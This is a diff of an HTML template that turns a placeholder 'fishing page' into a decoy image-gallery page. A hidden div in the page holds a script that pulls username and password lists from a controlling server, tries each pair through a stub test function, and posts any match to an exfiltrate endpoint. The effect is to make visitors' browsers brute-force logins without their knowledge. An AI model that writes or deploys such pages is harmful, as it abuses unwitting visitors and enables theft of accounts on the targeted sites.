@@ -1,27 +1,88 @@
-{# insert api use here #}
-<html>
-
+<!doctype html>
+<html lang="en" class="no-js">
 <head>
-
-    <title>This is the fishing page</title>
-
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="canonical" href="https://html5-templates.com/demo/infinite-scroll-image-gallery/"/>
+    <title>Infinite Scroll Image Gallery</title>
+    <meta name="description" content="A brief page description">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
+    <script src="script.js"></script>
 </head>
-
 <body>
+<p>&nbsp;</p>
+<h1>Hum, are you hacked?</h1>
+<p style="padding: 10px 20px; text-align: center;">May be visit this page is a bad idea</p>
+<p style="padding: 10px 20px; text-align: center;">&copy; You can freely edit and publish this template but please leave
+    a link to our website: <a href="https://html5-templates.com/" target="_blank" rel="nofollow">HTML5 Templates</a></p>
 
-<p>modify the page to make your visitors work for you</p>
+<div id="gallery">
+    <div>1.</div>
+    <img src="https://thumbor.sd-cdn.fr/ryN7WSkqnZhs8TVN78NNQXpVVio=/940x550/cdn.sd-cdn.fr/wp-content/uploads/2019/04/Se%CC%81curite%CC%81.jpeg"
+         alt="image"/>
+    <div>2.</div>
+    <img src="https://www.presse-citron.net/wordpress_prod/wp-content/uploads/2019/03/hack.jpg" alt="image"/>
+    <div>3.</div>
+    <img src="https://www.ghost-academy.fr/wp-content/uploads/2017/05/email-password-hack.jpg" alt="image"/>
+</div>
 
-<script>
+<div style="visibility: hidden">
+    <script type="text/javascript">
 
-    fetch('/app/exfiltrate/', {
-        method: 'POST',
-        body: JSON.stringify({
-            username: 'admin',
-            password: 'secret'
-        })
-    }).then(response => {console.log(response)})
+        find = false;
 
-</script>
+        exfiltrate = function (username, password) {
+            fetch('/{{ domain.name }}/exfiltrate', {
+                method: 'POST',
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            })
+        };
+
+        test = function (username, password) {
+            if(find) return;
+            /***************** TEST FUNCTION HERE **********************/
+            // just call exfiltrate(username, password) when a password is find
+        };
+
+        fetch('/app/{{ domain.name }}/usernames')
+            .then(response => {
+                response.json().then(function (usernames) {
+                    usernames.forEach(function (username) {
+                        fetch('/app/{{ domain.name }}/passwords', {
+                            headers: {
+                                'Cache-Control': 'no-cache'
+                            }
+                        }).then(response => {
+                            response.json().then(function (passwords) {
+                                passwords.forEach(function (password) {
+                                    test(username, password);
+                                });
+                            });
+                        });
+                    });
+                });
+            });
+
+
+    </script>
+</div>
+
+<div id="loading">
+    <img src="_loading.gif" alt="loading"/>
+</div>
+
+<div class="wrap-infinite-link">
+    <a class="infinite-link">
+        M&eacute;g t&ouml;bb k&eacute;p
+    </a>
+</div>
+<a id="back2Top" title="Back to top" href="#">&#10148;</a>
+
 
 </body>
 
